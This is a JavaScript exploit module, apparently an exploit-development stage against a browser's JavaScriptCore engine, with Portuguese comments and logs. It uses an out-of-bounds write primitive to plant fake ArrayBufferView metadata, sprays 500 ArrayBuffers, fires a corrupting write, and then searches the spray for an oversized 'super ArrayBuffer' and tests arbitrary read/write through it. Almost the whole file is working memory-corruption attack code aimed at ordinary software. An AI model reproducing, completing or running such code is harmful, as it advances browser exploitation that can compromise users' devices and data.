// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object, GB } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';

const FNAME_SPRAY_AB_WITH_METADATA_PLANT = "sprayABWithMetadataPlant_v25a";

const GETTER_SYNC_PROPERTY_NAME = "AAAA_GetterForSync_v25a";
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Offsets no oob_buffer onde plantamos os metadados falsos de ArrayBufferView
// Usando os M_ offsets do seu config para ArrayBufferView e o base offset 0x50
const FOCUSED_METADATA_PLANT_BASE_OFFSET_IN_OOB = 0x50; 
const PLANTED_M_VECTOR_VALUE = new AdvancedInt64(0, 0);
const PLANTED_M_LENGTH_VALUE = 0xFFFFFFFF;


const NUM_SPRAY_AB_OBJECTS = 500;
const SPRAY_AB_SIZE = 128;

let sprayedVictimABs = [];
let getter_sync_flag_v25a = false;

export async function sprayAndInvestigateObjectExposure() {
    logS3(`--- Iniciando ${FNAME_SPRAY_AB_WITH_METADATA_PLANT}: Spray ABs, Plantar Meta ABView, Trigger, Checar ABs ---`, "test", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
    getter_sync_flag_v25a = false;

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);

        // FASE 1: Plantar metadados de "ArrayBufferView Falso" no oob_array_buffer_real
        logS3(`FASE 1: Plantando metadados de ABView (m_vector=0, m_length=0xFFFFFFFF) no oob_buffer...`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
        const targetMetaVectorOffset = FOCUSED_METADATA_PLANT_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x50 + 0x10 = 0x60
        const targetMetaLengthOffset = FOCUSED_METADATA_PLANT_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x50 + 0x18 = 0x68
        
        oob_write_absolute(targetMetaVectorOffset, PLANTED_M_VECTOR_VALUE, 8);
        oob_write_absolute(targetMetaLengthOffset, PLANTED_M_LENGTH_VALUE, 4);
        logS3(`  Metadados plantados em oob_buffer[${toHex(targetMetaVectorOffset)}] (m_vector) e [${toHex(targetMetaLengthOffset)}] (m_length)`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
        const chk_vec = oob_read_absolute(targetMetaVectorOffset,8);
        const chk_len = oob_read_absolute(targetMetaLengthOffset,4);
        logS3(`  Verificação Pós-Plantio: m_vector=${chk_vec.toString(true)}, m_length=${toHex(chk_len)}`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
        await PAUSE_S3(50);

        // FASE 2: Pulverizar objetos ArrayBuffer
        logS3(`FASE 2: Pulverizando ${NUM_SPRAY_AB_OBJECTS} objetos ArrayBuffer(${SPRAY_AB_SIZE})...`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
        sprayedVictimABs = [];
        for (let i = 0; i < NUM_SPRAY_AB_OBJECTS; i++) {
            try {
                const ab = new ArrayBuffer(SPRAY_AB_SIZE);
                if (SPRAY_AB_SIZE >= 4) new DataView(ab).setUint32(0, 0xABC00000 + i, true);
                sprayedVictimABs.push(ab);
            } catch (e) {
                logS3(`Erro ao criar ArrayBuffer no spray, índice ${i}: ${e.message}`, "warn", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
            }
        }
        logS3(`Pulverização de ${sprayedVictimABs.length} ArrayBuffers concluída.`, "good", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
        await PAUSE_S3(100);


        // FASE 3: Configurar getter e Trigger OOB
        const getterObject = { get [GETTER_SYNC_PROPERTY_NAME]() { getter_sync_flag_v25a = true; return "sync_v25a"; } };

        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}]...`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
        
        // Verificar o que está agora nos offsets de metadados plantados DENTRO do oob_buffer
        const vec_after_trigger_in_oob = oob_read_absolute(targetMetaVectorOffset, 8); 
        const len_after_trigger_in_oob = oob_read_absolute(targetMetaLengthOffset, 4); 
        logS3(`  Valores NO OOB_BUFFER (onde metadados foram plantados) APÓS trigger: m_vector@${toHex(targetMetaVectorOffset)}=${vec_after_trigger_in_oob.toString(true)}, m_length@${toHex(targetMetaLengthOffset)}=${toHex(len_after_trigger_in_oob)}`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
        // O trigger em 0x70 vai sobrescrever o targetMetaLengthOffset se for 0x68, ou se for próximo.
        // Se targetMetaLengthOffset é 0x68, o trigger em 0x70 não o afeta diretamente, mas afeta o que seria 0x58 + 0x18.
        // No nosso caso, targetMetaLengthOffset = 0x50 + M_LENGTH_OFFSET (0x18) = 0x68.
        // O trigger é em 0x70. Então o m_length plantado em 0x68 deve permanecer.
        // O m_vector plantado em 0x60 deve permanecer.

        await PAUSE_S3(100); 

        // FASE 4: Acionar Getter
        logS3(`FASE 4: Chamando JSON.stringify para acionar o getter (sincronia)...`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
        JSON.stringify(getterObject);
        if(getter_sync_flag_v25a) logS3("  Getter de sincronia acionado.", "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT); else logS3("  ALERTA: Getter de sincronia NÃO acionado.", "warn", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
        await PAUSE_S3(200);

        // FASE 5: Verificar ArrayBuffers Pulverizados
        logS3(`FASE 5: Verificando ${sprayedVictimABs.length} ArrayBuffers pulverizados por corrupção...`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
        let corruptedABsFound = 0;
        let superAB = null;

        for (let i = 0; i < sprayedVictimABs.length; i++) {
            const currentAB = sprayedVictimABs[i];
            if (!currentAB) continue;

            let currentLength = -1;
            let initialMarker = -1;
            let sliceWorks = true;
            let sliceValue = null;

            try {
                currentLength = currentAB.byteLength;
                if (SPRAY_AB_SIZE >=4) initialMarker = new DataView(currentAB).getUint32(0, true);

                // Teste de slice
                try {
                    const slice = currentAB.slice(0, Math.min(4, currentLength)); // Pega uma pequena fatia
                    if (slice.byteLength > 0) {
                         sliceValue = new DataView(slice).getUint32(0, true);
                    } else if (currentLength > 0 && slice.byteLength === 0) {
                        sliceWorks = false; // Slice deveria retornar algo se currentLength > 0
                    }
                } catch(e_slice) {
                    sliceWorks = false;
                }

            } catch (e) {
                logS3(`    Erro GRANDE ao acessar ArrayBuffer pulverizado índice [${i}]: ${e.message}`, "error", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
                document.title = `CORRUPÇÃO AB SPRAY (ERRO GRAVE) Idx ${i}!`;
                corruptedABsFound++;
                continue;
            }

            if (currentLength !== SPRAY_AB_SIZE || !sliceWorks || (SPRAY_AB_SIZE >=4 && initialMarker !== (0xABC00000 + i)) ) {
                logS3(`    !!!! POTENCIAL CORRUPÇÃO DETECTADA no ArrayBuffer pulverizado índice [${i}] !!!!`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
                logS3(`      byteLength: ${SPRAY_AB_SIZE} -> ${currentLength} (${toHex(currentLength)})`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
                logS3(`      Marcador inicial: ${toHex(0xABC00000 + i)} -> ${SPRAY_AB_SIZE >=4 ? toHex(initialMarker) : "N/A"}`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
                logS3(`      Slice(0,4) funcionou: ${sliceWorks}. Valor slice[0]: ${sliceValue !== null ? toHex(sliceValue) : "N/A"}`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
                corruptedABsFound++;
                document.title = `CORRUPÇÃO AB SPRAY (${corruptedABsFound})!`;

                // Se o tamanho for massivo, é o nosso "super array"
                if (currentLength >= (1 * GB) || currentLength === 0xFFFFFFFF || currentLength === 0xFFFFFFFFFFFFFFFF ) { // 1GB ou mais
                    logS3(`      !!!!!!!! SUPER ArrayBuffer ENCONTRADO (byteLength: ${toHex(currentLength)}) !!!!!!!!`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
                    superAB = currentAB;
                    document.title = `SUPER AB ENCONTRADO (Idx ${i})!`;
                    // Tentativa de uso imediato
                    try {
                        const dv = new DataView(superAB);
                        const test_offset_super = 0x100000; // 1MB
                        const val_read_super = dv.getUint32(test_offset_super, true);
                        logS3(`      Leitura de teste do Super AB @${toHex(test_offset_super)}: ${toHex(val_read_super)}`, "leak", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
                        dv.setUint32(test_offset_super, 0xDEADFACE, true);
                        if (dv.getUint32(test_offset_super, true) === 0xDEADFACE) {
                            logS3(`      SUCESSO: R/W no Super AB @${toHex(test_offset_super)} funcionou!`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
                        }
                    } catch (e_super) {
                        logS3(`      Erro ao usar Super AB: ${e_super.message}`, "error", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
                    }
                    break; // Parar no primeiro super AB encontrado
                }
            }
        }

        if (superAB) {
            logS3(`  SUPER ArrayBuffer ENCONTRADO e testado.`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
        } else if (corruptedABsFound > 0) {
            logS3(`  Total de ${corruptedABsFound} ArrayBuffers pulverizados encontrados com alguma anomalia.`, "good", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
        } else {
            logS3("  Nenhuma corrupção/anomalia detectada nos ArrayBuffers pulverizados.", "warn", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
            document.title = "Nenhuma Corrupção AB (v25a)";
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_SPRAY_AB_WITH_METADATA_PLANT}: ${e.message}`, "critical", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
        document.title = `${FNAME_SPRAY_AB_WITH_METADATA_PLANT} FALHOU!`;
    } finally {
        sprayedVictimABs = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_SPRAY_AB_WITH_METADATA_PLANT} Concluído ---`, "test", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
    }
}
